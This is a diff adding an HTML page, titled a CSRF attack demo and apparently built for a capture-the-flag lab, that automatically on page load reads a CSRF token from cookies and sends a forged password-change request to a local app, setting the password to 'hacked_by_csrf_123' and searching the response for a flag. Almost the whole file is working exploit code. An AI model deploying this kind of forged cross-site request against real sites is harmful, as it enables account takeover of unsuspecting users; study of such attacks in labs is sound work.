@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+    <style>
+        body { 
+            font-family: Arial; 
+            padding: 50px; 
+            background: #f0f0f0; 
+            text-align: center;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .success { color: green; }
+        .error { color: red; }
+        .debug { 
+            background: #f8f9fa; 
+            padding: 15px; 
+            border-radius: 5px; 
+            margin: 20px 0;
+            text-align: left;
+            font-family: monospace;
+            font-size: 14px;
+        }
+        button {
+            padding: 12px 30px;
+            background: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:hover { background: #0056b3; }
+        #status { margin: 20px 0; padding: 15px; border-radius: 5px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔐 CSRF Attack Demo</h1>
+        <p>This page will automatically attempt to change your password.</p>
+        
+        <div id="status">⏳ Initializing...</div>
+        <div id="debug" class="debug">Loading...</div>
+        <button onclick="runAttack()">🚀 Run Attack Manually</button>
+    </div>
+
+    <script>
+        // Function to get CSRF token from cookie
+        function getCSRFToken() {
+            const cookies = document.cookie.split(';');
+            for (let cookie of cookies) {
+                const [name, value] = cookie.trim().split('=');
+                if (name === 'csrf_token') {
+                    return decodeURIComponent(value);
+                }
+            }
+            return null;
+        }
+
+        // Function to run the attack
+        async function runAttack() {
+            const statusDiv = document.getElementById('status');
+            const debugDiv = document.getElementById('debug');
+            
+            // Step 1: Read the CSRF token from cookie
+            const csrfToken = getCSRFToken();
+            
+            if (!csrfToken) {
+                statusDiv.innerHTML = '❌ <span class="error">No CSRF token found in cookies!</span>';
+                statusDiv.style.background = '#f8d7da';
+                statusDiv.style.color = '#721c24';
+                return;
+            }
+
+            statusDiv.innerHTML = `✅ <span class="success">CSRF token found: ${csrfToken}</span>`;
+            statusDiv.style.background = '#d4edda';
+            statusDiv.style.color = '#155724';
+            
+            debugDiv.innerHTML = `
+                <strong>🔍 Debug Information:</strong><br>
+                📝 CSRF Token: ${csrfToken}<br>
+                🍪 All Cookies: ${document.cookie}<br>
+                📡 Sending request...
+            `;
+
+            // Step 2: Prepare the attack parameters
+            const params = new URLSearchParams({
+                csrf_token: csrfToken,
+                currentPassword: 'password123',  // Try common passwords
+                newPassword: 'hacked_by_csrf_123',
+                confirmPassword: 'hacked_by_csrf_123'
+            });
+
+            try {
+                // Step 3: Send the malicious request
+                const response = await fetch('http://localhost:3000/security/change-password', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: params,
+                    credentials: 'include'  // Important: sends cookies
+                });
+
+                const text = await response.text();
+                
+                // Step 4: Check if attack succeeded
+                if (response.status === 200 && !text.includes('CSRF token mismatch')) {
+                    statusDiv.innerHTML = `🎉 <span class="success">SUCCESS! Password changed to: hacked_by_csrf_123</span>`;
+                    statusDiv.style.background = '#d4edda';
+                    statusDiv.style.color = '#155724';
+                    
+                    debugDiv.innerHTML += `<br>✅ <span style="color:green">Attack successful!</span>`;
+                    debugDiv.innerHTML += `<br>🔑 New password: hacked_by_csrf_123`;
+                    
+                    // Try to find flag in response
+                    const flagMatch = text.match(/FLAG{[^}]+}/) || text.match(/flag{[^}]+}/);
+                    if (flagMatch) {
+                        debugDiv.innerHTML += `<br>🏆 <strong style="color:#ff6b00">FLAG FOUND: ${flagMatch[0]}</strong>`;
+                    }
+                    
+                } else {
+                    statusDiv.innerHTML = `❌ <span class="error">Attack failed - Check debug info</span>`;
+                    statusDiv.style.background = '#f8d7da';
+                    statusDiv.style.color = '#721c24';
+                    debugDiv.innerHTML += `<br>❌ Response status: ${response.status}`;
+                    debugDiv.innerHTML += `<br>❌ Response contains error message`;
+                }
+                
+                // Show response preview
+                debugDiv.innerHTML += `<br><br><strong>📄 Response Preview (first 500 chars):</strong><br>`;
+                debugDiv.innerHTML += text.substring(0, 500) + '...';
+                
+            } catch (error) {
+                statusDiv.innerHTML = `❌ <span class="error">Error: ${error.message}</span>`;
+                statusDiv.style.background = '#f8d7da';
+                statusDiv.style.color = '#721c24';
+                debugDiv.innerHTML += `<br>❌ Error: ${error.message}`;
+            }
+        }
+
+        // Auto-run attack when page loads
+        window.onload = function() {
+            const debugDiv = document.getElementById('debug');
+            debugDiv.innerHTML = `
+                <strong>🔍 Initial Debug:</strong><br>
+                🍪 Cookies: ${document.cookie}<br>
+                🔑 CSRF Token: ${getCSRFToken() || 'Not found'}<br>
+                ⏳ Auto-attacking in 3 seconds...
+            `;
+            
+            setTimeout(() => {
+                runAttack();
+            }, 3000);
+        };
+    </script>
+</body>
+</html>
